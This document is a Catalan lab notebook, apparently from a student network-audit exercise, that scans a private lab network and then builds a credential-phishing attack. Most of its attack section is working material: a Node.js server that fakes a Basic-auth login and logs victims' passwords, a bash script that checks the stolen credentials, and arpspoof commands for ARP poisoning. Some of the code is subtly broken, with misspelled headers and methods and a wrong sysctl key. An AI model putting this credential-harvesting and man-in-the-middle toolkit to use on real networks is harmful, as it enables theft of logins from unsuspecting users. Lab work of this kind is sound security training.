[[Auditories - M12]]
```table-of-contents
```
---
# Informació general
- Adreça IP: 10.45.1.0/8
- DNS: 10.45.1.1/8
- MAIL: 10.45.4.10/8
- WEB / FTP: 10.45.1.2/8.
- DNS2 : 10.45.1.40/8
- PCLIENTL: 10.45.1.75/8
- PCLIENTL: 10.45.1.78/8
- ???: 1045.1.245/8

---
# MACHINES PWNED:
Sintaxi: <-IP-> | <-user-> | ROOT (anomenat com a BLOOD)
- `10.45.1.2` → Web server | ftp1/apache | BLOOD

---
# Identificació del lloc web amb credencials

Mitjançant un ping sweep, he aconseguit identificar les màquines aixecades. Amb un `nmap`, he aconseguit saber-ne l'adreça IP de la Web. Només calia fer un `banner grabbing` a l'adreça IP 10.45.1.2:

```shell
nmap -sn 10.45.1.0/24 > ping-sweep
nmap -sV -T5 -Pn --script=banner 10.45.1.2
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-06 17:02 CEST
Nmap scan report for 10.45.1.2
Host is up (0.00023s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp
|_banner: 220 Servidor ProFTPD (TarPrime) [::ffff:10.45.1.2]
| fingerprint-strings: 
|   GenericLines: 
|     220 Servidor ProFTPD (TarPrime) [::ffff:10.45.1.2]
|     Orden incorrecta: Intenta ser m
|     creativo
|     Orden incorrecta: Intenta ser m
|     creativo
|   Help: 
|     220 Servidor ProFTPD (TarPrime) [::ffff:10.45.1.2]
|     necesario SSL/TLS en el canal de control
|   NULL, SMBProgNeg, SSLSessionReq: 
|_    220 Servidor ProFTPD (TarPrime) [::ffff:10.45.1.2]
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.11
80/tcp   open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
443/tcp  open  ssl/http Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
8080/tcp open  http     Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=5/6%Time=681A2494%P=x86_64-pc-linux-gnu%r(NU
SF:LL,34,"220\x20Servidor\x20ProFTPD\x20\(TarPrime\)\x20\[::ffff:10\.45\.1
SF:\.2\]\r\n")%r(GenericLines,96,"220\x20Servidor\x20ProFTPD\x20\(TarPrime
SF:\)\x20\[::ffff:10\.45\.1\.2\]\r\n500\x20Orden\x20incorrecta:\x20Intenta
SF:\x20ser\x20m\xc3\xa1s\x20creativo\r\n500\x20Orden\x20incorrecta:\x20Int
SF:enta\x20ser\x20m\xc3\xa1s\x20creativo\r\n")%r(Help,62,"220\x20Servidor\
SF:x20ProFTPD\x20\(TarPrime\)\x20\[::ffff:10\.45\.1\.2\]\r\n550\x20necesar
SF:io\x20SSL/TLS\x20en\x20el\x20canal\x20de\x20control\r\n")%r(SSLSessionR
SF:eq,34,"220\x20Servidor\x20ProFTPD\x20\(TarPrime\)\x20\[::ffff:10\.45\.1
SF:\.2\]\r\n")%r(SMBProgNeg,34,"220\x20Servidor\x20ProFTPD\x20\(TarPrime\)
SF:\x20\[::ffff:10\.45\.1\.2\]\r\n");
Service Info: Hosts: Servidor, tech.tarprime.lan; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.87 seconds
```
![[Identificacio-de-ips.png]]
![[web-server-identificat.png]]

Podem veure que, la web que conté les credencials, és la web amb el port 8080. Si intentem entrar a la web, ens surt el següent:
![[intentar-accedir-curl.png]]

Veiem que ens demana una credencial vàlida per poder continuar sense passar per un una pàgina tipus lobby. Això ens ho posa molt més fàcil. Si, amb `ip spoofing` o `arp spoofing` aconsegueixo que la seva web derivi cap a mi, podria aconseguir que posessin les credencials sense adonar-se que estan identificant-se a una web clonada.

*Vista Web:*
![[intentar-accedir-web.png]]

---
# Planificació de captura de credencials

Ara, una vegada que sabem com funciona, podem intentar fer un script en JavaScript per replicar el funcionament i aspecte de l'autenticació. En aquest cas, em serà molt més fàcil fer un petit script amb Node.js, el qual em simularà l'autenticació. 

L'script és el següent:

```js
//Nom del fitxer: server.js
const express = require("express");
const fs = require("fs");
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.use((req, res, next) => {
  const auth = req.headers.authorization;

  if (!auth) {
    res.set('WWW-Authenticate', 'Basic realm="Login requerido"');
    return res.status(401).send();
  }

  const credentials = Buffer.from(auth.split(' ')[1], 'base64').toString();
  const [user, pass] = credentials.split(':');

  // Guardar credenciales
  fs.appendFileSync('credenciales.txt', `User: ${user} - Pass: ${pass}\n`);

  // Redireccionar tras captura
  res.redirect("http://10.45.1.2:8080");
});

app.listen(8080, () => {
  console.log("Servidor escuchando en puerto 8080");
});

==========VERSION2==========

const express = require("express");
const fs = require("fs");
const app = express();
const PORT = 8080;

app.use((req, res, next) => {
  const auth = req.headers.autorization;

  if (!auth) {
  res.set("WWW-Autenticate", 'Basic realm="Secure Area"');
  return
  res.status(401).send("Autentication Required.");
     
  }
  const b64auth = auth.split(" ")[1];
  const [user, pass] = Buffer.from(b64auth,"base64").toString().split(":");
  const log = `[${new Date().toISOString()}] USER: ${user} PASS: ${pass}\n`;

  fs.appendFileSync("credenciales.txt", log);
  res.sent("<h1>Acceso Denegado temporalmente. Intentelo de nuevo más tarde</h1>");
});

app.listen(PORT, () => {
   console.log(`Servidor de captura escuchando por el puerto ${PORT}`);
});
```

```bash
#valida_credenciales.sh
#!/bin/bash

SERVER_IP="10.45.1.2"
ARCHIVO="credenciales.txt"
VALIDADAS="validadas.txt"

touch $VALIDADAS

while sleep 2; do
	while IFS= read -r linea; do
		echo "$linea" | grep -qxFf $VALIDADAS && continue
		user=$(echo $linea | cut -d' ' -f2)
		pass=$(echo $linea | cut -d' ' -f5)

		curl -s --user "$user:$pass" http://$SERVER_IP > /dev/null
		if [ $? -eq 0 ]; then
			echo "[*] Credenciales validas: $user:$pass"
			echo "$linea" >> $VALIDADAS

			#Esta parte es para matar arpspoof
			pkill arpspoof

			echo "[*] Redirigiendo al servidor real..."
		fi
	done < $ARCHIVO
done
```

Instal·lació de **node.js** i **npm**:

```shell
sudo apt install nodejs npm
```

Instal·lem les dependències amb **npm**

```shell
sudo npm install express
```

Encenem el servidor:

```shell
sudo node server.js
```

Una vegada que estigui encès, podem anar cap al navegador i cercar la nostra adreça IP i port (`en aquest cas es 192.168.105.22:8080`):
![[atac-demo.png]]

Si introduïm les credencials:

![[atac-demo2.png]]

I ara, enviem les credencials i parem el servidor, veurem que es genera un fitxer anomenat "**credenciales.txt**". Si li fem un cat, veurem que el contingut són les credencials que vam introduir abans.
![[atac-demo3.png]]

Amb això provem que el concepte funciona correctament.

Passem al següent...

---
# ARP POISONING
Habilitem el forwarder per l'enviada de paquets:

```shell
sudo sysctl -w net.ipv4.forward=1
```

Amb l'eina `arpspoof`, aplicaré l'atac ARP POISONING. Per instal·lar-lo:

```shell
sudo apt install dsniff
```

sudo arpspoof -i eno1 -t 10.45.1.2 10.45.0.200 